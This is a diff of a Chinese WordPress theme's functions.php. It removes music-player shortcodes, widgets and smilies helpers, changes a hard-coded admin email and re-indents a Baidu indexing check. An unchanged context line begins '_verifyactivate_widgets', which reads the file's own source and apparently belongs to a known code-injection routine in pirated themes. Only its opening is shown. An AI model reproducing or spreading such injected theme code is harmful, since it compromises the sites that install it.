@@ -365,25 +365,6 @@ add_action( 'customize_preview_init', 'amativeness_customize_preview_js' );
  */
 add_filter( 'pre_option_link_manager_enabled', '__return_true' );
 
-//音乐播放器短代码1
-function myplayer($atts, $content=null){
-extract(shortcode_atts(array("true"=>'true',"false"=>'false'),$atts)); //autoplay设置自动播放,loop设置循环播放,改成true即可
-return '<embed width="402" height="95" src="http://box.baidu.com/widget/flash/bdspacesong.swf?&autoPlay=false&loop='.$false.'&url='.$content.'" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">';
-}
-add_shortcode('y','myplayer'); //同样的,y可以改成你想设置的短代码
-
-//音乐播放器短代码2
-function myplayer2($atts, $mp3url=null){
-return '<embed src="http://vdisk.weibo.com/js/swf/musicplayer/mp3Player.swf?version=4 &amp;url='.$mp3url.'" width="600" height="60" type="application/x-shockwave-flash" wmode="transparent" />';   
-}   
-add_shortcode('mp3','myplayer2');
-
-//音乐播放器短代码3
-function myplayer3($atts, $mp3link=null){
-return '<embed type="application/x-shockwave-flash" src="http://ageme.u.qiniudn.com/l.swf" style="undefined" id="oneBitInsert_1" name="oneBitInsert_1" bgcolor="#FFFFFF" quality="high" width="12" height="12" flashvars="foreColor=#585A5E&amp;analytics=true&amp;filename='.$mp3link.'">';   
-}   
-add_shortcode('l','myplayer3');
-
 //文章提示框
 function wztsk($atts, $tsk=null){
 return '<div class="tishik"><p>'.$tsk.'</p></div>';   
@@ -428,12 +409,12 @@ function reply($content){
         }  
     }  
  
-    $admin_email = "570047973@qq.com"; //博主Email,博主直接查看  
+    $admin_email = "306578968@qq.com"; //博主Email,博主直接查看  
     if ($email == $admin_email) {  
         $stats = 'show';  
         }  
  
-        $hide_notice = '<div style="text-align:center;border:1px dashed #FF9A9A;padding:8px;margin:10px auto;color:#FF6666;">温馨提示：此处内容需要<a href="'. get_permalink().'#respond" title="评论本文">评论本文</a>后，<a href="javascript:window.location.reload();" title="刷新">刷新本页</a>才能查看。</div>';  
+        $hide_notice = '<div style="text-align:center;border:1px dashed #FF9A9A;padding:8px;margin:10px auto;color:#FF6666;">此处内容需要<a href="'. get_permalink().'#respond" title="评论本文">评论本文</a>后，<a href="javascript:window.location.reload();" title="刷新">刷新本页</a>才能查看。</div>';  
         if( $stats == 'show' ){  
             $content = str_replace($hide_words[0], $hide_words[1], $content);  
         }else{  
@@ -462,59 +443,7 @@ function creekoo_editor_buttons($buttons){
 add_filter("mce_buttons_3", "creekoo_editor_buttons"); 
 
 ?>
-<?php 
 
-class My_Widget extends WP_Widget {
-
-	function My_Widget()
-	{
-		$widget_ops = array('description' => '鬼梦近期评论');
-		$control_ops = array('width' => 400, 'height' => 300);
-		parent::WP_Widget(false,$name='鬼梦近期评论',$widget_ops,$control_ops);  
-
-                //parent::直接使用父类中的方法
-                //$name 这个小工具的名称,
-                //$widget_ops 可以给小工具进行描述等等。
-                //$control_ops 可以对小工具进行简单的样式定义等等。
-	}
-
-	function form($instance) { // 给小工具(widget) 添加表单内容
-		$title = esc_attr($instance['title']);
-	?>
-	<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php esc_attr_e('Title:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>
-
-	<?php
-    }
-	function update($new_instance, $old_instance) { // 更新保存
-		return $new_instance;
-	}
-	function widget($args, $instance) { // 输出显示在页面上
-	extract( $args );
-        $title = apply_filters('widget_title', empty($instance['title']) ? __('近期评论') : $instance['title']);
-        ?>
-              <?php echo $before_widget; ?>
-                  <?php if ( $title )
-                        echo $before_title . $title . $after_title; ?>
-                        <ul id='recentcomments'>
-                        <?php
-global $wpdb;
-$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved,comment_author_email, comment_type,comment_author_url, SUBSTRING(comment_content,1,25) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND comment_author != '万戈' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT 10";
-$comments = $wpdb->get_results($sql);
-$output = $pre_HTML;
-foreach ($comments as $comment) {
-$output .= "\n<li class='recentcomments'><a href=\"" . get_permalink($comment->ID) . "#comment-" . $comment->comment_ID . "\" title=\"" . $comment->post_title . " 上的评论\">". strip_tags($comment->comment_author) ."： ". strip_tags($comment->com_excerpt) ."</a></li>";
-}
-$output .= $post_HTML;
-$output = convert_smilies($output);
-echo $output;
-?></ul>
-              <?php echo $after_widget; ?>
-
-        <?php
-	}
-}
-register_widget('My_Widget');
-?>
 <?php
 function _verifyactivate_widgets(){
 	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
@@ -1032,73 +961,9 @@ function dropdown_links_cats($cat) {
 	}
 
 }
-// Registers each instance of our widget on startup
-function yg_adv_blogroll_register() {
-	if ( !$options = get_option('yg_adv_blogroll') )
-		$options = array();
 
-	$widget_ops = array('classname' => 'adv-blogroll', 'description' => __('Widget that shows your bookmarks as you want.'));
-	$control_ops = array('id_base' => 'adv-blogroll');
-	$name = __('鬼梦友情链接', 'advanced_blogroll');
 
-	$registered = false;
-	foreach ( array_keys($options) as $o ) {
-		// Old widgets can have null values for some reason
-		if ( !isset($options[$o]['cat']) ) // we used 'something' above in our exampple.  Replace with with whatever your real data are.
-			continue;
-
-		// $id should look like {$id_base}-{$o}
-		$id = "adv-blogroll-$o"; // Never never never translate an id
-		$registered = true;
-		wp_register_sidebar_widget( $id, $name, 'yg_adv_blogroll_widget', $widget_ops, array( 'number' => $o ) );
-		wp_register_widget_control( $id, $name, 'yg_adv_blogroll_control', $control_ops, array( 'number' => $o ) );
-	}
-
-	// If there are none, we register the widget's existance with a generic template
-	if ( !$registered ) {
-		wp_register_sidebar_widget( 'adv-blogroll-1', $name, 'yg_adv_blogroll_widget', $widget_ops, array( 'number' => -1 ) );
-		wp_register_widget_control( 'adv-blogroll-1', $name, 'yg_adv_blogroll_control', $control_ops, array( 'number' => -1 ) );
-	}
-}
-
-add_action('plugins_loaded', 'yg_adv_blogroll_loadlang');
-function yg_adv_blogroll_loadlang() {
-	load_plugin_textdomain('advanced_blogroll', 'wp-content/plugins/advanced-blogroll');
-}
-
-// This is important
-add_action( 'widgets_init', 'yg_adv_blogroll_register' );
-
-// Modifying default gravatar
-add_filter( 'avatar_defaults','newgravatar' );function newgravatar ($avatar_defaults) {
-$myavatar = get_bloginfo('template_directory') . '/images/ali6.jpg'; //把user-avatar.png 上传到images文件夹中
-$avatar_defaults[$myavatar] = "user-avatar"; // 讨论设置选项中显示的名称
-return $avatar_defaults;
-}
-
-//评论表情
-function wp_smilies() {
-	global $wpsmiliestrans;
-	if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
-	$smilies = array_unique($wpsmiliestrans);
-	$link='';
-	foreach ($smilies as $key => $smile) {
-		$file = get_bloginfo('template_directory').'/images/smilies/'.$smile;
-		$value = " ".$key." ";
-		$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";
-		$imglink = htmlspecialchars($img);
-		$link .= "<a href=\"#commentform\" title=\"表情\" onclick=\"document.getElementById('comment-content').value += '{$value}'\">{$img}</a>&nbsp;&nbsp;&nbsp;";
-		$click="return click_a('sm')";
-	}
-	echo '<div class="s-submit"><button onclick="'.$click.'">表情</button><ul id="sm" style="display:none;">'.$link.'</ul></div>';
-}
-//修改评论表情调用路径
-function g_smilies_src ($img_src, $img, $siteurl){
-	return get_bloginfo('template_directory').'/images/smilies/'.$img;
-}
-	add_filter('smilies_src','g_smilies_src',1,10); 
-	
-	/*Plugin Name: Baidu-Accept
+/*Plugin Name: Baidu-Accept
 Plugin URI: http://www.d4v.com.cn
 Description: 判断当前文章是否被百度收录，若没有被收录则可点击提交至百度，加速收录！(此插件在文章页面仅管理员可见)
 Version: 1.0
@@ -1107,17 +972,18 @@ Author URI: http://www.d4v.com.cn
 License: GPL
 */
 function d4v($url){
-$url='http://www.baidu.com/s?wd='.$url;
-$curl=curl_init();
-curl_setopt($curl,CURLOPT_URL,$url);
-curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
-$rs=curl_exec($curl);
-curl_close($curl);
-if(!strpos($rs,'没有找到')){
-return 1;
-}else{
-return 0;
-}
+	$url='http://www.baidu.com/s?wd='.$url;
+	$curl=curl_init();
+	curl_setopt($curl,CURLOPT_URL,$url);
+	curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+	$rs=curl_exec($curl);
+	curl_close($curl);
+	if(!strpos($rs,'没有找到')){
+		return 1;
+	}
+	else{
+		return 0;
+	}
 }
 add_filter( 'the_content',  'baidu_submit' );
 function baidu_submit( $content ) {
@@ -1129,9 +995,11 @@ function baidu_submit( $content ) {
 		return $content;
 	}
 
+//重定向gravatar到多说
 function mytheme_get_avatar($avatar) {
-$avatar = str_replace(array("www.gravatar.com","0.gravatar.com","1.gravatar.com","2.gravatar.com"),"gravatar.duoshuo.com",$avatar);
+	$avatar = str_replace(array("www.gravatar.com","0.gravatar.com","1.gravatar.com","2.gravatar.com"),"gravatar.duoshuo.com",$avatar);
 return $avatar;
 }
 add_filter( 'get_avatar', 'mytheme_get_avatar', 10, 3 );
+
 ?>
